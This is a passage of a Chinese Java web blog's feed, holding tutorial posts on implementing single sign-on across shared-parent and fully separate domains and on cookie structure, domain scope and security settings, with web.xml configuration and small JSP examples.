    <published>2014-03-05T08:11:00.000Z</published>
    <updated>2014-05-11T15:50:12.000Z</updated>
    <content type="html"><![CDATA[<p>完全跨域的单点登录实现方案基本和上篇文章介绍的一样，只不过生成ticket的过程更复杂些。上篇文章中的项目是不能完全跨域的，由于多个应用系统以及认证系统域不同，也没有共同的父域，导致登录后，认证系统向浏览器写的ticket在其它应用系统中获取不到，这时访问其它应用系统时，没有携带着ticket的cookie，无法认证也无法单点登录。那解决的方案是每个应用系统都向浏览器cookie中写入ticket，请看下图，图中浅蓝色圆角区域代表不同的域，当用户通过浏览器第一次访问应用系统1时，由于还没有登录，会被引导到认证系统进行登录。下面开始单点登录的过程：<span style="background-color:rgb(255,255,255)"><span style="color:#3333ff">认证系统根据用户在浏览器中输入的登录信息，进行身份认证，如果认证通过，返回给浏览器一个证明[认证系统_ticket]；这时再通过浏览器将[认证系统_ticket]发送到到应用系统1的设置cookie的url，应用系统1返回给浏览器一个证明[应用系统1_ticket]，这时再将请求重定向到最初访问的页面，以后应用系统1就可以自动登录了。现在用户访问了应用系统2，由于应用系统2没有生成过cookie（但是用户已经在应用系统1登录过一次了），将请求重定向到认证系统；认证系统检测到已经生成过[认证系统_ticket]了，认证通过；再通过浏览器将[认证系统_ticket]发送到到应用系统2的设置cookie的url，应用系统2返回给浏览器一个证明[应用系统2_ticket]，这时再将请求重定向到最初访问的页面。应用系统3也同样原理，我们等于将ticket做了一次同步，保证了每个应用系统都有一份认证系统产生的ticket。剩余的ticket验证过程和上篇文章一样了。</span></span><img src="http://img.blog.csdn.net/20140305150846046?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvZ2hzYXU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt=""></p>
<p>ticket同步的过程用jsonp应该也可以实现，我基于上篇文章中的项目实现了完全跨域的单点登录，可以在<a href="http://download.csdn.net/detail/ghsau/6995969" target="_blank">这里</a>下载项目。<br><a id="more"></a><br><strong>域名准备</strong></p>
<p>修改hosts文件，映射3个域名：</p>
<pre><code><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> web1<span class="preprocessor">.com</span>
<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> web2<span class="preprocessor">.com</span>
<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> passport<span class="preprocessor">.com</span>
</code></pre><p>三个域名都是独立的，没有共同父域，web1和web2用于访问应用系统，passport用于访问认证系统。</p>
<p><strong>项目部署</strong></p>
<p>项目中包含的是两个Eclipse Project，导入到Eclipse/MyEclipse后，可能需要设置下JavaEE类库。WebSSOAuth为认证系统，WebSSODemo为应用系统，如果映射的域名和我设置的一样，不需要设置，直接部署即可。如果不一样，需要修改下WebSSODemo/WEB-INF/web.xml文件。关键配置信息如下：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre>1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre></td><td class="code"><pre><span class="tag">&lt;<span class="title">filter</span>&gt;</span>
<span class="tag">&lt;<span class="title">filter-name</span>&gt;</span>SSOAuth<span class="tag">&lt;/<span class="title">filter-name</span>&gt;</span>
<span class="tag">&lt;<span class="title">filter-class</span>&gt;</span>com.ghsau.filter.SSOAuth<span class="tag">&lt;/<span class="title">filter-class</span>&gt;</span>
<span class="tag">&lt;<span class="title">init-param</span>&gt;</span>
	<span class="comment">&lt;!-- 认证系统服务 --&gt;</span>
	<span class="tag">&lt;<span class="title">param-name</span>&gt;</span>SSOService<span class="tag">&lt;/<span class="title">param-name</span>&gt;</span>
	<span class="tag">&lt;<span class="title">param-value</span>&gt;</span>http://passport.com:8080/WebSSOAuth/SSOAuth<span class="tag">&lt;/<span class="title">param-value</span>&gt;</span>
<span class="tag">&lt;/<span class="title">init-param</span>&gt;</span>
<span class="tag">&lt;<span class="title">init-param</span>&gt;</span>
	<span class="comment">&lt;!-- 认证系统ticket名称 --&gt;</span>
	<span class="tag">&lt;<span class="title">param-name</span>&gt;</span>cookieName<span class="tag">&lt;/<span class="title">param-name</span>&gt;</span>
	<span class="tag">&lt;<span class="title">param-value</span>&gt;</span>SSOID<span class="tag">&lt;/<span class="title">param-value</span>&gt;</span>
<span class="tag">&lt;/<span class="title">init-param</span>&gt;</span>
<span class="tag">&lt;/<span class="title">filter</span>&gt;</span>
<span class="tag">&lt;<span class="title">filter-mapping</span>&gt;</span>
	<span class="tag">&lt;<span class="title">filter-name</span>&gt;</span>SSOAuth<span class="tag">&lt;/<span class="title">filter-name</span>&gt;</span>
	<span class="tag">&lt;<span class="title">url-pattern</span>&gt;</span>*.jsp<span class="tag">&lt;/<span class="title">url-pattern</span>&gt;</span>
<span class="tag">&lt;/<span class="title">filter-mapping</span>&gt;</span>
<span class="tag">&lt;<span class="title">filter-mapping</span>&gt;</span>
	<span class="tag">&lt;<span class="title">filter-name</span>&gt;</span>SSOAuth<span class="tag">&lt;/<span class="title">filter-name</span>&gt;</span>
	<span class="tag">&lt;<span class="title">url-pattern</span>&gt;</span>/logout<span class="tag">&lt;/<span class="title">url-pattern</span>&gt;</span>
<span class="tag">&lt;/<span class="title">filter-mapping</span>&gt;</span>
<span class="tag">&lt;<span class="title">filter-mapping</span>&gt;</span>
	<span class="tag">&lt;<span class="title">filter-name</span>&gt;</span>SSOAuth<span class="tag">&lt;/<span class="title">filter-name</span>&gt;</span>
	<span class="tag">&lt;<span class="title">url-pattern</span>&gt;</span>/setCookie<span class="tag">&lt;/<span class="title">url-pattern</span>&gt;</span>
<span class="tag">&lt;/<span class="title">filter-mapping</span>&gt;</span>
</pre></td></tr></table></figure>

<p>如果域名或端口号和我的不一致，可以修改对应配置项。最后部署到应用服务器中，启动服务器。</p>
<p><strong>SSO使用</strong></p>
<p>首先输入第一个应用系统的访问地址，<a href="http://web1.com:8080/WebSSODemo/index.jsp" target="_blank">http://web1.com:8080/WebSSODemo/index.jsp</a>，如果是第一次访问的话，会自动跳转到登录页，如下图：<img src="http://img.blog.csdn.net/20140305154755140?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvZ2hzYXU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt=""></p>
<p>系统中内置了3个用户，张三、李四、王五，用户名和密码皆为拼音全拼，输入zhangsan/zhangsan登录后，会自动跳转到我们刚才访问的页面，页面中显示了登录的用户名及欢迎信息，如下图：<img src="http://img.blog.csdn.net/20140305154843171?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvZ2hzYXU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt=""></p>
<p>这时，我们再输入第二个应用系统的访问地址，<a href="http://web2.com:8080/WebSSODemo/index.jsp" target="_blank">http://web2.com:8080/WebSSODemo/index.jsp</a>，我们发现，没有进行第二次登录，同样页面中显示了登录的用户名及欢迎信息，如下图：<img src="http://img.blog.csdn.net/20140305154930046?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvZ2hzYXU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt=""></p>
<p>我们接着点击Logout注销用户，页面跳转到了登录页面，这时我们再回头访问第一个应用系统的页面，发现同样跳转到了登录页面。</p>
<p>互联网中的完全跨域登录的站点也有很多，如<a href="http://www.taobao.com/" target="_blank">淘宝</a>和<a href="http://www.tmall.com/" target="_blank">天猫</a>，但肯定不是我这样实现的。我的实现中，认证系统和应用系统是通过url参数来传递ticket，可能存在一些不稳定因素。应用系统的每次请求都会通过HTTP远程到认证系统进行验证ticket，速度上应该会慢一些，这里可以改进一步，在每个应用系统中也维护一份tickets，验证时，首先到本系统中验证，如果不存在，再远程到认证系统进行验证，但这也增加了应用系统的代码量。本文完，如果有什么问题，欢迎讨论。</p>
]]></content>
    <summary type="html"><![CDATA[<p>完全跨域的单点登录实现方案基本和上篇文章介绍的一样，只不过生成ticket的过程更复杂些。上篇文章中的项目是不能完全跨域的，由于多个应用系统以及认证系统域不同，也没有共同的父域，导致登录后，认证系统向浏览器写的ticket在其它应用系统中获取不到，这时访问其它应用系统时，没有携带着ticket的cookie，无法认证也无法单点登录。那解决的方案是每个应用系统都向浏览器cookie中写入ticket，请看下图，图中浅蓝色圆角区域代表不同的域，当用户通过浏览器第一次访问应用系统1时，由于还没有登录，会被引导到认证系统进行登录。下面开始单点登录的过程：<span style="background-color:rgb(255,255,255)"><span style="color:#3333ff">认证系统根据用户在浏览器中输入的登录信息，进行身份认证，如果认证通过，返回给浏览器一个证明[认证系统_ticket]；这时再通过浏览器将[认证系统_ticket]发送到到应用系统1的设置cookie的url，应用系统1返回给浏览器一个证明[应用系统1_ticket]，这时再将请求重定向到最初访问的页面，以后应用系统1就可以自动登录了。现在用户访问了应用系统2，由于应用系统2没有生成过cookie（但是用户已经在应用系统1登录过一次了），将请求重定向到认证系统；认证系统检测到已经生成过[认证系统_ticket]了，认证通过；再通过浏览器将[认证系统_ticket]发送到到应用系统2的设置cookie的url，应用系统2返回给浏览器一个证明[应用系统2_ticket]，这时再将请求重定向到最初访问的页面。应用系统3也同样原理，我们等于将ticket做了一次同步，保证了每个应用系统都有一份认证系统产生的ticket。剩余的ticket验证过程和上篇文章一样了。</span></span><img src="http://img.blog.csdn.net/20140305150846046?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvZ2hzYXU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt=""></p>
<p>ticket同步的过程用jsonp应该也可以实现，我基于上篇文章中的项目实现了完全跨域的单点登录，可以在<a href="http://download.csdn.net/detail/ghsau/6995969" target="_blank">这里</a>下载项目。<br>]]></summary>
    
      <category term="SSO" scheme="http://www.ghsau.com/tags/SSO/"/>
    
      <category term="Java Web" scheme="http://www.ghsau.com/categories/Java%20Web/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[共同父域下的单点登录]]></title>
    <link href="http://www.ghsau.com/2014/03/04/%E5%85%B1%E5%90%8C%E7%88%B6%E5%9F%9F%E4%B8%8B%E7%9A%84%E5%8D%95%E7%82%B9%E7%99%BB%E5%BD%95/"/>
    <id>http://www.ghsau.com/2014/03/04/共同父域下的单点登录/</id>
    <published>2014-03-04T14:38:00.000Z</published>
    <updated>2014-05-11T15:51:07.000Z</updated>
    <content type="html"><![CDATA[<p>单点登录(Single Sign On)，简称为SSO，SSO不仅在企业级开发很常用，在互联网中更是大行其道。随便举几个例子，比如我们登录新浪微博后，再访问新浪首页后，我们发现，已经自动登录了；再比如我们登录CSDN后，可以写博客、逛论坛、下载资源等等。前者是完全跨域的单点登录，下文会讲，后者是共同父域下(www.csdn.net、blog.csdn.net、bbs.csdn.net、passport.csdn.net)的单点登录，也就是本文的主要内容。</p>
<p>单点登录实际上是“身份认证”的整合，当我们存在多个应用时，我们希望登录了其中的一个应用，再访问其他应用时，会自动登录，避免用户重复的体力劳动。单点登录的实现原理是比较简单的，如下图所示，当用户通过浏览器第一次访问应用系统1时，由于还没有登录，会被引导到认证系统进行登录。下面开始单点登录的过程：<span style="color:#3333ff">认证系统根据用户在浏览器中输入的登录信息，进行身份认证，如果认证通过，返回给浏览器一个证明ticket(票)；用户再访问其它应用系统时，会带着ticket；应用系统接收到ticket后，会将其发送到认证系统进行合法性校验；校验通过后，用户就不需要再次输入用户名密码来登录了，从而实现了单点登录的功能</span>。<img src="http://img.blog.csdn.net/20140304211546578?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvZ2hzYXU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt=""></p>
<p>上面描述的过程实际上是WEB-SSO。要实现SSO，首先必须要有统一的认证系统，其次每个应用系统都通过认证系统来校验用户，所以这需要两方面的配合。WEB-SSO是比较好实现的，尤其是共同父域的情况下，我们可以通过浏览器的cookie来保存ticket。今天我用Servlet技术实现了SSO的主要功能，可以在<a href="http://download.csdn.net/detail/ghsau/6993043" target="_blank">这里</a>下载项目。<br><a id="more"></a><br><strong>域名准备</strong></p>
<p>修改hosts文件，映射3个域名：</p>
<pre><code><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> web1<span class="preprocessor">.ghsau</span><span class="preprocessor">.com</span>
<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> web2<span class="preprocessor">.ghsau</span><span class="preprocessor">.com</span>
<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> passport<span class="preprocessor">.ghsau</span><span class="preprocessor">.com</span>
</code></pre><p>3个域名必须拥有共同父域(.ghsau.com)，web1和web2用于访问应用系统，passport用于访问认证系统。</p>
<p><strong>项目部署</strong></p>
<p>项目中包含的是两个Eclipse Project，导入到Eclipse/MyEclipse后，可能需要设置下JavaEE类库。WebSSOAuth为认证系统，WebSSODemo为应用系统，如果映射的域名和我设置的一样，不需要设置，直接部署即可。如果不一样，需要修改下两个项目的web.xml文件。关键配置信息如下：</p>
<p>WebSSOAuth/WEB-INF/web.xml：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre>1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
</pre></td><td class="code"><pre><span class="tag">&lt;<span class="title">servlet</span>&gt;</span>
<span class="tag">&lt;<span class="title">servlet-name</span>&gt;</span>SSOAuth<span class="tag">&lt;/<span class="title">servlet-name</span>&gt;</span>
<span class="tag">&lt;<span class="title">servlet-class</span>&gt;</span>com.ghsau.servlet.SSOAuth<span class="tag">&lt;/<span class="title">servlet-class</span>&gt;</span>
<span class="tag">&lt;<span class="title">init-param</span>&gt;</span>
  <span class="comment">&lt;!-- ticket名称 --&gt;</span>
  <span class="tag">&lt;<span class="title">param-name</span>&gt;</span>cookieName<span class="tag">&lt;/<span class="title">param-name</span>&gt;</span>
  <span class="tag">&lt;<span class="title">param-value</span>&gt;</span>SSOID<span class="tag">&lt;/<span class="title">param-value</span>&gt;</span>
<span class="tag">&lt;/<span class="title">init-param</span>&gt;</span>
<span class="tag">&lt;<span class="title">init-param</span>&gt;</span>
  <span class="comment">&lt;!-- ticket作用域 --&gt;</span>
  <span class="tag">&lt;<span class="title">param-name</span>&gt;</span>domainName<span class="tag">&lt;/<span class="title">param-name</span>&gt;</span>
  <span class="tag">&lt;<span class="title">param-value</span>&gt;</span>.ghsau.com<span class="tag">&lt;/<span class="title">param-value</span>&gt;</span>
<span class="tag">&lt;/<span class="title">init-param</span>&gt;</span>
<span class="tag">&lt;<span class="title">init-param</span>&gt;</span>
  <span class="tag">&lt;<span class="title">param-name</span>&gt;</span>secure<span class="tag">&lt;/<span class="title">param-name</span>&gt;</span>
  <span class="tag">&lt;<span class="title">param-value</span>&gt;</span>false<span class="tag">&lt;/<span class="title">param-value</span>&gt;</span>
<span class="tag">&lt;/<span class="title">init-param</span>&gt;</span>
<span class="tag">&lt;<span class="title">init-param</span>&gt;</span>
  <span class="comment">&lt;!-- ticket内容加密密钥，必须为24个字符，中文算2个字符 --&gt;</span>
  <span class="tag">&lt;<span class="title">param-name</span>&gt;</span>secretKey<span class="tag">&lt;/<span class="title">param-name</span>&gt;</span>
  <span class="tag">&lt;<span class="title">param-value</span>&gt;</span>111111112222222233333333<span class="tag">&lt;/<span class="title">param-value</span>&gt;</span>
<span class="tag">&lt;/<span class="title">init-param</span>&gt;</span>
<span class="tag">&lt;<span class="title">init-param</span>&gt;</span>
  <span class="comment">&lt;!-- 服务器中ticket的有效期，单位分钟 --&gt;</span>
  <span class="tag">&lt;<span class="title">param-name</span>&gt;</span>ticketTimeout<span class="tag">&lt;/<span class="title">param-name</span>&gt;</span>
  <span class="tag">&lt;<span class="title">param-value</span>&gt;</span>10080<span class="tag">&lt;/<span class="title">param-value</span>&gt;</span>
<span class="tag">&lt;/<span class="title">init-param</span>&gt;</span>
<span class="tag">&lt;/<span class="title">servlet</span>&gt;</span>
<span class="tag">&lt;<span class="title">servlet-mapping</span>&gt;</span>
  <span class="tag">&lt;<span class="title">servlet-name</span>&gt;</span>SSOAuth<span class="tag">&lt;/<span class="title">servlet-name</span>&gt;</span>
  <span class="tag">&lt;<span class="title">url-pattern</span>&gt;</span>/SSOAuth<span class="tag">&lt;/<span class="title">url-pattern</span>&gt;</span>
<span class="tag">&lt;/<span class="title">servlet-mapping</span>&gt;</span>
</pre></td></tr></table></figure>

<p>如果域名或端口号和我的不一致，可以修改对应配置项。最后部署到应用服务器中，启动服务器。</p>
<p><strong>SSO使用</strong></p>
<p>首先输入第一个应用系统的访问地址，<a href="http://web1.ghsau.com:8080/WebSSODemo/index.jsp" target="_blank">http://web1.ghsau.com:8080/WebSSODemo/index.jsp</a>，如果是第一次访问的话，会自动跳转到登录页，如下图：<img src="http://img.blog.csdn.net/20140304220529515?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvZ2hzYXU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt=""></p>
<p>系统中内置了3个用户，张三、李四、王五，用户名和密码皆为拼音全拼，输入zhangsan/zhangsan登录后，会自动跳转到我们刚才访问的页面，页面中显示了登录的用户名及欢迎信息，如下图：<img src="http://img.blog.csdn.net/20140304220835828?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvZ2hzYXU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt=""></p>
<p>这时，我们再输入第二个应用系统的访问地址，<a href="http://web2.ghsau.com:8080/WebSSODemo/index.jsp" target="_blank">http://web2.ghsau.com:8080/WebSSODemo/index.jsp</a>，我们发现，没有进行第二次登录，同样页面中显示了登录的用户名及欢迎信息，如下图：<img src="http://img.blog.csdn.net/20140304221211718?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvZ2hzYXU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt=""></p>
<p>我们接着点击Logout注销用户，页面跳转到了登录页面，这时我们再回头访问第一个应用系统的页面，发现同样跳转到了登录页面。这给用户的使用效果就是，一个应用登录了，其它的应用都会自动登录，而一个应用中注销了，其它的应用也都会自动注销，好神奇的样子。</p>
<p>项目中提供了源码，代码的实现思路就是上面的那个图，ticket保存在cookie中，利用cookie域的特性，实现了ticket在不同应用中都能够获取到，ticket的验证过程是使用了HttpClient来发送的验证请求，ticket的加密使用了3DES，具体可以看DESUtils.java，好了，就到这里吧，如果有什么问题，欢迎讨论。</p>
]]></content>
    <summary type="html"><![CDATA[<p>单点登录(Single Sign On)，简称为SSO，SSO不仅在企业级开发很常用，在互联网中更是大行其道。随便举几个例子，比如我们登录新浪微博后，再访问新浪首页后，我们发现，已经自动登录了；再比如我们登录CSDN后，可以写博客、逛论坛、下载资源等等。前者是完全跨域的单点登录，下文会讲，后者是共同父域下(www.csdn.net、blog.csdn.net、bbs.csdn.net、passport.csdn.net)的单点登录，也就是本文的主要内容。</p>
<p>单点登录实际上是“身份认证”的整合，当我们存在多个应用时，我们希望登录了其中的一个应用，再访问其他应用时，会自动登录，避免用户重复的体力劳动。单点登录的实现原理是比较简单的，如下图所示，当用户通过浏览器第一次访问应用系统1时，由于还没有登录，会被引导到认证系统进行登录。下面开始单点登录的过程：<span style="color:#3333ff">认证系统根据用户在浏览器中输入的登录信息，进行身份认证，如果认证通过，返回给浏览器一个证明ticket(票)；用户再访问其它应用系统时，会带着ticket；应用系统接收到ticket后，会将其发送到认证系统进行合法性校验；校验通过后，用户就不需要再次输入用户名密码来登录了，从而实现了单点登录的功能</span>。<img src="http://img.blog.csdn.net/20140304211546578?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvZ2hzYXU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt=""></p>
<p>上面描述的过程实际上是WEB-SSO。要实现SSO，首先必须要有统一的认证系统，其次每个应用系统都通过认证系统来校验用户，所以这需要两方面的配合。WEB-SSO是比较好实现的，尤其是共同父域的情况下，我们可以通过浏览器的cookie来保存ticket。今天我用Servlet技术实现了SSO的主要功能，可以在<a href="http://download.csdn.net/detail/ghsau/6993043" target="_blank">这里</a>下载项目。<br>]]></summary>
    
      <category term="SSO" scheme="http://www.ghsau.com/tags/SSO/"/>
    
      <category term="Java Web" scheme="http://www.ghsau.com/categories/Java%20Web/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Cookie深度解析]]></title>
    <link href="http://www.ghsau.com/2014/03/04/cookie%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90/"/>
    <id>http://www.ghsau.com/2014/03/04/cookie深度解析/</id>
    <published>2014-03-04T04:37:00.000Z</published>
    <updated>2014-05-11T15:52:50.000Z</updated>
    <content type="html"><![CDATA[<p>最近在公司做了Web端单点登录(SSO)功能，基于Cookie实现，做完之后感觉有必要总结一下，本文着重讲解Cookie，下文会说明单点登录的实现方案。</p>
<p><strong>Cookie简介</strong></p>
<p>众所周知，Web协议（也就是HTTP）是一个无状态的协议（HTTP1.0）。一个Web应用由很多个Web页面组成，每个页面都有唯一的URL来定义。用户在浏览器的地址栏输入页面的URL，浏览器就会向Web Server去发送请求。如下图，浏览器向Web服务器发送了两个请求，申请了两个页面。这两个页面的请求是分别使用了两个单独的HTTP连接。所谓无状态的协议也就是表现在这里，浏览器和Web服务器会在第一个请求完成以后关闭连接通道，在第二个请求的时候重新建立连接。Web服务器并不区分哪个请求来自哪个客户端，对所有的请求都一视同仁，都是单独的连接。这样的方式大大区别于传统的（Client/Server）C/S结构,在那样的应用中，客户端和服务器端会建立一个长时间的专用的连接通道。正是因为有了无状态的特性，每个连接资源能够很快被其他客户端所重用，一台Web服务器才能够同时服务于成千上万的客户端。<img src="http://img.blog.csdn.net/20140303202645515?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvZ2hzYXU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt=""><br><a id="more"></a><br>但是我们通常的应用是有状态的。先不用提不同应用之间的SSO，在同一个应用中也需要保存用户的登录身份信息。例如用户在访问页面1的时候进行了登录，但是刚才也提到，客户端的每个请求都是单独的连接，当客户再次访问页面2的时候，如何才能告诉Web服务器，客户刚才已经登录过了呢？浏览器和服务器之间有约定：通过使用cookie技术来维护应用的状态。Cookie是可以被Web服务器设置的字符串，并且可以保存在浏览器中。如下图所示，当浏览器访问了页面1时，web服务器设置了一个cookie，并将这个cookie和页面1一起返回给浏览器，浏览器接到cookie之后，就会保存起来，在它访问页面2的时候会把这个cookie也带上，Web服务器接到请求时也能读出cookie的值，根据cookie值的内容就可以判断和恢复一些用户的信息状态。<img src="http://img.blog.csdn.net/20140303203325796?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvZ2hzYXU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt=""></p>
<p><strong>Cookie组成</strong></p>
<p>cookie是由名称、内容、作用路径、作用域、协议、生存周期组成，另外还有个HttpOnly属性，HttpOnly属性很重要，如果您在cookie中设置了HttpOnly属性，那么通过js脚本(document.cookie)将无法读取到cookie信息，这样能一定程度上的防止XSS攻击，关于XSS可以看我之前的文章—<a href="http://blog.csdn.net/ghsau/article/details/17027893" target="_blank">XSS攻击及防御</a>。Tomcat服务器设置的JSESSIONID就是HttpOnly的。<img src="http://img.blog.csdn.net/20140303213906046?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvZ2hzYXU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt=""></p>
<p>JavaEE中对cookie做了封装，对应的是下面这个类：</p>
<pre><code>java<span class="preprocessor">.lang</span><span class="preprocessor">.Object</span>
  |
  +--javax<span class="preprocessor">.servlet</span><span class="preprocessor">.http</span><span class="preprocessor">.Cookie</span>
</code></pre><p>该类可以设置cookie的名称、内容、作用路径、作用域、协议、生存周期，but不能设置HttpOnly属性，不知道这么做是出于什么考虑，如果非要设置HttpOnly的cookie，我们可以通过响应头来处理：</p>
<pre><code>response.setHeader("<span class="operator"><span class="keyword">Set</span>-Cookie<span class="string">", "</span>cookiename=<span class="keyword">value</span>;</span>Path=/;Domain=domainvalue;Max-Age=seconds;HttpOnly");
</code></pre><p><strong>Cookie作用域</strong></p>
<p>测试Cookie的作用域需要弄几个域名，修改C:\Windows\System32\drivers\etc\hosts文件，将本机ip映射出四个域名，如下：</p>
<pre><code><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> web1<span class="preprocessor">.ghsau</span><span class="preprocessor">.com</span>
<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> web2<span class="preprocessor">.ghsau</span><span class="preprocessor">.com</span>

<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> web1<span class="preprocessor">.com</span>
<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> web2<span class="preprocessor">.com</span>
</code></pre><p>前两个是2级域名(ghsau.com)相同，3级域名(web1、web2)不同，后两个是2级域名不同。然后我们再写两个jsp，一个用于设置Cookie，另一个用于显示Cookie。</p>
<p>SetCookie.jsp：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre>1
2
3
4
5
6
7
</pre></td><td class="code"><pre><span class="vbscript">&lt;%@ page language=<span class="string">"java"</span> contentType=<span class="string">"text/html; charset=utf-8"</span> pageEncoding=<span class="string">"utf-8"</span>%&gt;</span>
<span class="vbscript">&lt;%
	Cookie cookie = <span class="keyword">new</span> Cookie(<span class="string">"test_key"</span>, <span class="string">"test_value"</span>);
	cookie.setPath(<span class="string">"/"</span>);
	// cookie.setDomain(<span class="string">".ghsau.com"</span>);
	<span class="built_in">response</span>.addCookie(cookie);
%&gt;</span>
</pre></td></tr></table></figure>

<p>ShowCookie.jsp：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre>1
2
3
4
5
6
7
8
9
10
</pre></td><td class="code"><pre>&lt;<span class="variable">%@</span> page language=<span class="string">"java"</span> contentType=<span class="string">"text/html; charset=utf-8"</span> pageEncoding=<span class="string">"utf-8"</span><span class="variable">%&gt;</span>
&lt;%
	<span class="comment">// 输出cookies，过滤掉JSESSIONID</span>
	Cookie[] cookies = request.getCookies();
	<span class="keyword">if</span>(cookies != null)
		<span class="keyword">for</span>(Cookie cookie : cookies) {
			<span class="keyword">if</span>(cookie.getName().equals(<span class="string">"JSESSIONID"</span>))    <span class="keyword">continue</span>;
			out.println(cookie.getName() + <span class="string">"-"</span> + cookie.getValue());
		}
<span class="variable">%&gt;</span>
</pre></td></tr></table></figure>

<p>将这两个jsp放到应用后，部署到服务器中，启动服务器，我们就可以通过域名来访问了。</p>
<p>测试一，首先访问<a href="http://web1.ghsau.com:8080/WebSSOAuth/SetCookie.jsp" target="_blank">http://web1.ghsau.com:8080/WebSSOAuth/SetCookie.jsp</a>，设置cookie后，再访问<a href="http://web1.ghsau.com:8080/WebSSOAuth/ShowCookie.jsp" target="_blank">http://web1.ghsau.com:8080/WebSSOAuth/ShowCookie.jsp</a>，页面输出test_key=test_value，这时我们访问<a href="http://web2.ghsau.com:8080/WebSSOAuth/ShowCookie.jsp" target="_blank">http://web2.ghsau.com:8080/WebSSOAuth/ShowCookie.jsp</a>，发现页面什么都没有输出，这时我们得出结论，cookie默认情况下作用域为当前域名。<br>测试二，将SetCookie.jsp第五行注释打开，按照上面的顺序依次访问，我们发现<a href="http://web2.ghsau.com:8080/WebSSOAuth/ShowCookie.jsp" target="_blank">http://web2.ghsau.com:8080/WebSSOAuth/ShowCookie.jsp</a>中输出了<a href="http://web1.ghsau.com:8080/WebSSOAuth/SetCookie.jsp" target="_blank">http://web1.ghsau.com:8080/WebSSOAuth/SetCookie.jsp</a>中设置的cookie，这时我们得出结论，cookie作用域为父级域名时，所有子级域名都可以得到该cookie，这也是实现跨子域SSO的关键。这时有些朋友可能会想到那我把cookie作用域设置到顶级域名(.com、.net)上，是不是用该顶级域名的网站就都能获取该cookie了？这样设置的cookie，浏览器是不存储的，无效的cookie。<br>测试三，修改SetCookie.jsp第五行代码为cookie.setDomain(“.web2.com”)，首先访问<a href="http://web1.com:8080/WebSSOAuth/SetCookie.jsp" target="_blank">http://web1.com:8080/WebSSOAuth/SetCookie.jsp</a>，设置cookie后，这时我们访问<a href="http://web2.com:8080/WebSSOAuth/ShowCookie.jsp" target="_blank">http://web2.com:8080/WebSSOAuth/ShowCookie.jsp</a>，发现页面什么都没有输出，这时我们得出结论，cookie不能跨二级域名设置。</p>
<p><strong>Cookie安全性</strong></p>
<p>cookie中的数据通常会包含用户的隐私数据，首先要保证数据的保密性，其次要保证数据不能被伪造或者篡改，基于这两点，我们通常需要对cookie内容进行加密，加密方式一般使用对称加密(单密钥，如<a href="http://baike.baidu.com/view/878529.htm?fromId=7510" target="_blank">DES</a>)或非对称加密(一对密钥，如<a href="http://baike.baidu.com/view/10613.htm?fromId=7520" target="_blank">RSA</a>)，密钥需要保存在服务器端一个安全的地方，这样，别人不知道密钥时，无法对数据进行解密，也无法伪造或篡改数据。另外，像上文提到的，重要的cookie数据需要设置成HttpOnly的，避免跨站脚本获取你的cookie，保证了cookie在浏览器端的安全性。还有我们可以设置cookie只作用于安全的协议(https)，JavaEE中可以通过Cookie类的setSecure(boolean flag)来设置，设置后，该cookie只会在https下发送，而不会再http下发送，保证了cookie在服务器端的安全性，服务器https的设置可以参照<a href="http://blog.csdn.net/lifetragedy/article/details/7699236" target="_blank">该文章</a>。</p>
]]></content>
